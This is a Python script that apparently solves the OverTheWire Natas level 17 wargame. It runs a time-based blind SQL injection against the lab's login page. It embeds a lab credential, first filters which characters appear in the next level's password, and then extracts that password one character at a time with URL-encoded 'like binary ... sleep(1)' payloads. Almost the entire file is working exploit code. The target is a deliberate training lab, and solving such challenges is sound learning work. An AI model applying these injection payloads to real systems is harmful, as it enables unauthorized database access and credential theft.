import requests, string
from requests.auth import HTTPBasicAuth

Auth = HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
headers = {'content-type': 'application/x-www-form-urlencoded'}
filteredchars = ''
passwd = ''
allchars = ''.join([string.ascii_letters, string.digits])

'''

for char in allchars:
	payload = 'username=natas18%22+and+password+like+binary+%27%25{0}%25%27+and+sleep%281%29+%23'.format(char)
	r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=Auth, data=payload, headers=headers)
	if(r.elapsed.seconds >= 1):
		filteredchars += char
		print(filteredchars)

'''

filteredchars = 'dghjlmpqsvwxyCDFIKOPR470'

for i in range(32):
	for char in filteredchars:
		payload = 'username=natas18%22+and+password+like+binary%20%27{0}%25%27and%20sleep(1)%23'.format(passwd + char)
		r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=Auth, data=payload, headers=headers)
		if(r.elapsed.seconds >= 1):
			passwd += char
			print(passwd)
			break
